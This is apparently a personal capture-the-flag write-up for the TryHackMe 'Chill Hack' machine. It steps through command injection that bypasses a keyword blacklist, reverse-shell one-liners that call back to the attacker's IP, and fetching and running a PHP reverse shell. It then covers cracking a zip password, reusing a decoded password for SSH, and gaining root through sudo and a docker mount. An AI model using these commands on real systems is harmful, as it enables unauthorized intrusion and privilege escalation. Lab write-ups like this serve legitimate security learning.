## Nmap

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.24.189
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

## FTP

1. note contents

```
─[glack@parrot]─[~/Desktop/THM/chill_hack]
└──╼ $cat note.txt 
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

- potential username - `Apaar`
### HTTP

1. found `http://10.10.135.182/secret/` with input filed saying command
2. we are able to ping ourselves but when trying to use injection commands like `bash -i >& /dev/tcp/10.17.24.189/9999 0>&1`. it is not working(even with burp)

1. As the ftp note says there is some kind of filtering

2. Used this resource `https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions`
3. Using this payload to bypass filtering

```
echo `which python3`
```

when only using `which python3` it is failing


`wget http://10.17.24.189:8000/php-reverse-shell.php`

- used this writeup `https://dangilbert.gitbook.io/try-hack-me/writeups/chillhack`


- used the payload and got the source code in page source code 

```
<?php if(isset($_POST['command'])) 
{ $cmd = $_POST['command']; $store = explode(" ",$cmd); 

$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls'); 

for($i=0; $i<count($store); $i++) { for($j=0; $j<count($blacklist); $j++) { if($store[$i] == $blacklist[$j]) {?>
```


```
curl http://10.17.24.189:8000/php-reverse-shell.php -o /dev/shm/revshell.php


curl http://10.17.24.189:8000/php-reverse-shell.php -o /tmp/revshell.php

```


```
php7.2 /dev/shm/revshell.php
```

this was the way to get a reverse shell. I should have used this.



- When retrying the machine i used below commands to get a shell


`cd /tmp && wget http://10.17.24.189:8000/php-reverse-shell.php`

`chmod +x /tmp/php-reverse-shell.php`

`php7.2 /tmp/php-reverse-shell.php`

## Priv Esc

- found a directory at `/var/www/files`
-

1. Downloaded these files in to my system 
```
$ ls
002d7e638fb463fb7a266f5ffc7ac47d.gif
hacker-with-laptop_23-2147985341.jpg
$ pythom -m http.server 8000
```

- there was a hint in `www-data@ubuntu:/var/www/files$ cat hacker.php`

```
<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>

<h1 style="background-color:red;">You have reached this far.</h2>

<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
```


```
─[glack@parrot]─[~/Desktop/THM/chill_hack]
└──╼ $steghide extract -sf hacker.jpg 
Enter passphrase: 
wrote extracted data to "backup.zip".

┌─[glack@parrot]─[~/Desktop/THM/chill_hack]
└──╼ $unzip backup.zip 
Archive:  backup.zip
[backup.zip] source_code.php password: 
   skipping: source_code.php         incorrect password
┌─[✗]─[glack@parrot]─[~/Desktop/THM/chill_hack]
└──╼ $zip2john
```


2. zip2john was taking too much time ss i used the writeup method 

```
fcrackzip --use-unzip --dictionary --init-password /usr/share/wordlists/rockyou.txt backup.zip

PASSWORD FOUND!!!!: pw == pass1word
```



```
─[glack@parrot]─[~/Desktop/THM/chill_hack]
└──╼ $cat source_code.php



$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
	
```

```
─[glack@parrot]─[~/Desktop/THM/chill_hack]
└──╼ $echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn0wmYp@ssw0rd
```


2. Was able to ssh login into the machine using 

`anurodh:!d0ntKn0wmYp@ssw0rd`

### Priv Esc 1

- there is a bash file at `anurodh@ubuntu:/home/apaar$ ./.helpline.sh `

- we are also able to read this file `anurodh@ubuntu:/home/apaar/.ssh$ cat authorized_keys`

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
```
tried to login into root using this key but not working


this is a public key and we cannot generate private key using this


- ran this but nothing useful
`find / -type f -user apaar -ls 2>/dev/null`


- finding SUID bits but nothing here as well
```
find / -type f -perm -4000 -ls 2>/dev/null
```

- `sudo -l` gives us this `(apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh`

but we dont have writable permissions for this file

- this means that `apaar` can run this file as sudo.  So priv esc to root will be easy but now we have to figure out how to get `apaar` user's shell or creds

- got fed up here and using the writeup

- sooooo `docker` priv esc is pretty easy with `gtfo.bins`
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

this gives us root easily



- Used another writeup for different methods
```
The user’s supplied input is directly passed to a bash instance and we could use this to our advantage and execute a bash shell and get a bash instance as the user Apaar.
```


here we are able to run a binary with sudo privileges as a different user

```
anurodh@ubuntu:/home/apaar$ sudo -u apaar ./.helpline.sh 
```

```
Hello user! I am cg,  Please enter your message: id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

- we can get the user flag

```
Please enter your message: cat local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

- using this we get shell as `apaar`
```
Please enter your message: bash
id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

- used this to get root
```
anurodh@ubuntu:/home/apaar$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- and the flag
```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```